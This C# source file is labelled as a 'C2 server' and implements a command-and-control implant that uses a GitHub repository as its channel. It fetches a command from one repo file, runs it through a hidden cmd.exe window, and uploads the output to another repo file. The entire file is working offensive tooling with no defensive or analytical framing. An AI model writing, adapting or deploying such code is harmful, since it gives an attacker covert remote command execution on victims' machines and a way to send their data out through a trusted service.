// C2 SERVER OF ISLAMIC REPUBLIC OF PAKISTAN

using System;
using System.Diagnostics;
using System.Threading.Tasks;
using Octokit;

namespace GITHUBC2
{
    internal class Program
    {
        private const string Input = "Your_Github_input.txt";
        private const string Output = "Your_github_output.txt";
        private const string RepositoryOwner = "Your_Owner";
        private const string RepositoryName = "Your_Repo";
        private const string AuthToken = "Your_personal_Auth_token";

        private static async Task Main(string[] args)
        {
            var client = new GitHubClient(new ProductHeaderValue("n-app"));
            var tokenAuth = new Credentials(AuthToken);
            client.Credentials = tokenAuth;

            var fileContent = await client.Repository.Content.GetAllContents(RepositoryOwner, RepositoryName, Input);
            var inputCMD = fileContent[0].Content;

            var output = ExecuteCommand(inputCMD);
            
    

            var outputFile = await client.Repository.Content.GetAllContents(RepositoryOwner, RepositoryName, Output);
            var updateRequest = new UpdateFileRequest("update", output, outputFile[0].Sha);

            await client.Repository.Content.UpdateFile(RepositoryOwner, RepositoryName, Output, updateRequest);
        }

        private static string ExecuteCommand(string command)
        {
            var processInfo = new ProcessStartInfo("cmd.exe")
            {
                RedirectStandardOutput = true,
                RedirectStandardInput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            var process = new Process { StartInfo = processInfo };
            process.Start();
            process.StandardInput.WriteLine($"cmd /k {command}");
            string output = process.StandardOutput.ReadToEnd();
            return output;
        }
    }
}

